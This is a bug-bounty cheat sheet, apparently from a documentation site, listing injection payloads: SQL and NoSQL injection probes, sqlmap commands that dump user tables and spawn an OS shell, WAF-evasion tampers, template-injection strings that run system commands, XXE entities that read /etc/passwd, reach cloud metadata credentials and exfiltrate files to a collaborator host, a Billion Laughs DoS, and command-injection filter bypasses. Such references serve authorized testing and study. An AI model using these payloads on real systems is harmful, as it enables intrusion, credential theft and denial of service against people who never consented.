---
title: "Injection Attacks: SQLi, SSTI, XXE & Command Injection"
description: "SQL & NoSQL injection, server-side template injection, XXE, and OS command injection methodology with WAF bypasses"
tags:
  - Bug Bounty
  - SQLi
  - SSTI
  - XXE
  - RCE
  - Critical
---

# Injection Attacks: SQLi, SSTI, XXE & RCE

---

## 1. SQL Injection

=== " Detection & Manual Testing"

    ```bash
    # Boolean-based / Error-based quick probes
    ' OR 1=1-- -
    ' OR '1'='1
    " OR "1"="1
    ') OR ('1'='1
    ' OR SLEEP(5)-- -
    '; WAITFOR DELAY '0:0:5'-- -
    # Time-based (blind) payloads by DBMS
    MySQL/MariaDB : ' AND IF(1=1,SLEEP(5),0)-- -
    MSSQL : '; IF (1=1) WAITFOR DELAY '0:0:5'-- -
    PostgreSQL : '; SELECT pg_sleep(5)-- -
    Oracle : ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
    SQLite : ' AND 1=randomblob(1000000000)-- -
    ```

=== " Automated Exploitation (sqlmap)"

    ```bash
    # Capture a request from Burp (right click -> Save item) and run sqlmap on it
    sqlmap -r request.txt -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment
    # Direct target, enumerate DBs, dump users table, get OS shell
    sqlmap -u "https://<DOMAIN>/api/v1/item?id=1" --cookie="session=<COOKIE>" -p id \
           --dbms=mysql --dbs --batch --technique=BEUST

    sqlmap -u "https://<DOMAIN>/item?id=1" -D app_db -T users --dump
    sqlmap -u "https://<DOMAIN>/item?id=1" --os-shell --batch
    # WAF evasion: use a chain of tampers + delay + proxy through Burp
    sqlmap -r request.txt --tamper=between,charencode,randomcase,space2comment,modsecurityversioned \
           --delay=1 --random-agent --proxy=http://127.0.0.1:8080
    ```

=== " Common WAF / Filter Bypasses"

    ```sql
    -- Keyword splitting & comments
    /*!50000 SELECT*/ * FROM users
    SE/**/LECT * FROM users
    UN/**/ION SEL/**/ECT

    -- Case randomization & inline whitespace
    sElEcT * FrOm users WhErE id=1
    SELECT%09*%09FROM%09users

    -- Encoding chains (URL double-encode, Unicode)
    %2527 OR %25271%2527=%25271
    ' OR 1=1/*!UNION/**/SELECT/**/1,2,3*/

    -- Bypassing quotes-blacklist with hex / CHAR()
    SELECT * FROM users WHERE name=0x61646d696e
    ```

!!! warning "NoSQL Injection (MongoDB & CouchDB)"
    Don't stop at SQL — modern Node/Mongo apps are full of NoSQLi:
    ```json
    {"email": {"$ne": null}, "password": {"$ne": null}}
    {"email": {"$gt": ""}, "password": {"$gt": ""}}
    {"email": {"$regex": "^admin"}, "password": {"$ne": "x"}}
    {"username": {"$in": ["admin","administrator"]}, "password": {"$ne": 1}}
    ```
    Also test `$where` JavaScript execution and `$lookup` cross-collection data leaks.

---

## 2. Server-Side Template Injection (SSTI)

SSTI turns a template render into **full RCE**. Trigger points: custom email templates, invoice/PDF generators, "custom theme" settings, error message templates, and username/profile fields rendered server-side.

=== " Polyglot Detection"

    ```text
    ${{<%[%'"}}%\.
    {{7*7}} -> 49 means Jinja2/Twig/Nunjucks
    ${7*7} -> 49 means FreeMarker/Velocity/Thymeleaf
    <%= 7*7 %> -> 49 means ERB/EJS
    #{7*7} -> 49 means Ruby/Pebble/Thymeleaf
    {{7*'7'}} -> 7777777 = Jinja2 | 49 = Twig
    @(7*7) -> 49 means Razor (.NET)
    ```

=== " Engine-Specific RCE Payloads"

    ```python
    # Jinja2 (Python / Flask)
    {{ cycler.__init__.__globals__.os.popen('id').read() }}
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
    {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
    # Twig (PHP / Symfony)
    {{ ['id']|filter('system') }}
    {{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
    {{ ['id','']|sort('system') }}
    # FreeMarker (Java)
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
    ${"freemarker.template.utility.Execute"?new()("id")}
    # Velocity (Java)
    #set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
    # Smarty (PHP)
    {system('id')}
    {php}system('id');{/php}
    ```

---

## 3. XML External Entity (XXE) Injection

Find XXE anywhere XML is parsed: **SOAP APIs, SAML responses, DOCX/XLSX/PPTX uploads, SVG avatars, RSS/Atom feeds, `application/xml` endpoints, and PDF generators**.

```xml
<!-- Classic in-band file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>

<!-- SSRF via external entity -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>

<!-- Blind Out-of-Band (exfiltrate file contents via DNS/HTTP) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://<COLLABORATOR_DOMAIN>/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- Hosted evil.dtd on your server: -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://<COLLABORATOR_DOMAIN>/?x=%file;'>"> %all; -->

<!-- Billion Laughs DoS -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
```

```bash
# DOCX / XLSX / SVG payload wrapping (upload a malicious document)
# 1. unzip document.docx -d docx_unpacked
# 2. Inject DOCTYPE + entity into word/document.xml
# 3. rezip -r malicious.docx [Content_Types].xml _rels docProps word
# 4. Upload -> server parses -> file server-side file contents / SSRF callback
```

---

## 4. OS Command Injection

| Context | Payload |
| :--- | :--- |
| **Basic chaining** | `127.0.0.1; id` &nbsp;/&nbsp; `127.0.0.1 && id` &nbsp;/&nbsp; `127.0.0.1 \| id` |
| **Blind (time-based)** | `127.0.0.1; sleep 10` &nbsp;/&nbsp; `127.0.0.1 & ping -c 10 127.0.0.1 &` |
| **Blind (OOB)** | `127.0.0.1; nslookup $(whoami).<COLLABORATOR_DOMAIN>` |
| **Newline injection** | `127.0.0.1%0aid` (bypasses space filtering) |
| **Space bypass** | `cat${IFS}/etc/passwd` &nbsp;/&nbsp; `cat</etc/passwd` &nbsp;/&nbsp; `{cat,/etc/passwd}` |
| **Blacklist bypass** | `who$()ami` &nbsp;/&nbsp; `w'h'o'a'm'i` &nbsp;/&nbsp; `who\am\i` &nbsp;/&nbsp; `$(tr '[A-Z]' '[a-z]'<<<"WHOAMI")` |
| **Windows** | `& whoami` &nbsp;/&nbsp; `\| whoami` &nbsp;/&nbsp; `%COMSPEC% /c whoami` &nbsp;/&nbsp; `ping -n 10 127.0.0.1` |
| **Argument injection** | `--config=/etc/passwd`, `-oProxyCommand=id` (see below) |

```bash
# Argument injection: git / curl / tar / zip / ffmpeg / tcpdump flags that execute commands
curl --config /etc/passwd # Read arbitrary file as curl config
ssh -oProxyCommand="sh -c 'id'" x # ProxyCommand RCE
zip test.zip -T -TT 'sh #' # Exiftool / zip unix-to-unix archive abuse
tar -xf archive.tar --to-command=id
```